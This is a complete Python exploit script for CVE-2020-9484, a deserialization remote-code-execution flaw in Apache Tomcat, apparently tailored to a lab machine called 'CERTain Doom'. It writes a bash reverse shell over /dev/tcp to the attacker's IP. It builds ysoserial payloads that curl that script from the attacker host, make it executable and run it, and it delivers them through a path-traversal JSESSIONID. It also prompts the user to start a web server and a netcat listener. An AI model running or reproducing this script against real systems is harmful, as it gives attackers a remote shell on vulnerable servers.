import requests
import os
import subprocess
import argparse
import time

# Exploit Title: Apache Tomcat RCE by deserialization (Python Version for CERTain Doom and JDK 11)
# CVE-ID: CVE-2020-9484
# Original Author: Pentestical
# Python Version by: Ryan Montgomery (0day)
# Shoutout to ChatGPT for interactive mode and the cleanup :)

YSOSERIAL_URL = "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
YSOSERIAL_FILENAME = "ysoserial-all.jar"
JAVA_PATH = "/usr/lib/jvm/java-11-openjdk-amd64/bin"  # Java 11 path

def verbose(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def download_ysoserial():
    if not os.path.exists(YSOSERIAL_FILENAME):
        verbose(f"[*] Downloading {YSOSERIAL_FILENAME} from {YSOSERIAL_URL}")
        response = requests.get(YSOSERIAL_URL, stream=True)
        with open(YSOSERIAL_FILENAME, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        verbose(f"[+] {YSOSERIAL_FILENAME} downloaded successfully")
    else:
        verbose(f"[+] {YSOSERIAL_FILENAME} already exists, skipping download")

def create_payload_files(attacker_ip, attacker_port):
    payload_file = 'payload.sh'
    verbose(f"[+] Creating {payload_file} (reverse shell script)...")

    with open(payload_file, 'w') as f:
        f.write(f"#!/usr/bin/bash\nbash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'\n")

    verbose("[*] Generating downloadPayload.session...")
    subprocess.run([f"{JAVA_PATH}/java", "-jar", YSOSERIAL_FILENAME, "CommonsCollections2",
                    f"curl http://{attacker_ip}/payload.sh -o /usr/local/tomcat/temp/uploads/payload.sh"],
                   stdout=open('downloadPayload.session', 'w'))

    verbose("[*] Generating chmodPayload.session...")
    subprocess.run([f"{JAVA_PATH}/java", "-jar", YSOSERIAL_FILENAME, "CommonsCollections2",
                    "chmod 777 /usr/local/tomcat/temp/uploads/payload.sh"],
                   stdout=open('chmodPayload.session', 'w'))

    verbose("[*] Generating executePayload.session...")
    subprocess.run([f"{JAVA_PATH}/java", "-jar", YSOSERIAL_FILENAME, "CommonsCollections2",
                    "bash /usr/local/tomcat/temp/uploads/payload.sh"],
                   stdout=open('executePayload.session', 'w'))

    verbose(f"[+] All payloads created, {payload_file} is ready.")

def upload_payload(session_id, payload_file, target_ip, target_port):
    verbose(f"[*] Uploading {payload_file} with session ID: {session_id}...")
    url = f"http://{target_ip}:{target_port}/reports/upload"

    headers = {
        'Cookie': f'JSESSIONID={session_id}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
    }

    files = {
        'uploadFile': (payload_file, open(payload_file, 'rb'), 'application/octet-stream')
    }

    response = requests.post(url, headers=headers, files=files)
    verbose(f"[*] Server response: {response.status_code} - {response.reason}")

def execute_payloads(target_ip, target_port):
    verbose("[+] Uploading and executing payloads...")

    upload_payload("../../../../../temp/uploads/downloadPayload", "downloadPayload.session", target_ip, target_port)
    upload_payload("../../../../../temp/uploads/chmodPayload", "chmodPayload.session", target_ip, target_port)
    upload_payload("../../../../../temp/uploads/executePayload", "executePayload.session", target_ip, target_port)

    verbose("[+] Payloads executed. Check for your reverse shell.")

def interactive_mode():
    print("[*] Interactive mode selected.")
    attacker_ip = input("Enter your attacker IP: ")
    attacker_port = input("Enter the port to listen for reverse shell: ")
    target_ip = input("Enter the target IP or hostname: ")
    target_port = input("Enter the target port (default: 8080): ")

    return attacker_ip, int(attacker_port), target_ip, int(target_port or 8080)

def main():
    parser = argparse.ArgumentParser(description='CVE-2020-9484 Exploit Script (modified for CERTain Doom)')
    parser.add_argument('-a', '--attacker', help='Attacker IP (for reverse shell)')
    parser.add_argument('-p', '--port', type=int, help='Attacker port (for reverse shell)')
    parser.add_argument('-t', '--target', help='Target IP')
    parser.add_argument('-P', '--tport', type=int, help='Target port (usually 8080)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Run in interactive mode')

    args = parser.parse_args()

    if args.interactive:
        args.attacker, args.port, args.target, args.tport = interactive_mode()

    if not all([args.attacker, args.port, args.target, args.tport]):
        parser.error("All arguments are required in non-interactive mode. Use -i for interactive mode.")

    verbose("[!] Before running this script, make sure to:")
    verbose("    - Start a Python HTTP server in the directory containing payload.sh (this script will create it for you if you didn't make it yourself):")
    verbose("      sudo python3 -m http.server 80")
    verbose(f"    - Start a Netcat listener on port {args.port}:")
    verbose(f"      nc -nvlp {args.port}")
    input("[*] Press Enter to continue once the web server and Netcat listener are running...")

    download_ysoserial()

    create_payload_files(args.attacker, args.port)
    execute_payloads(args.target, args.tport)

if __name__ == "__main__":
    main()
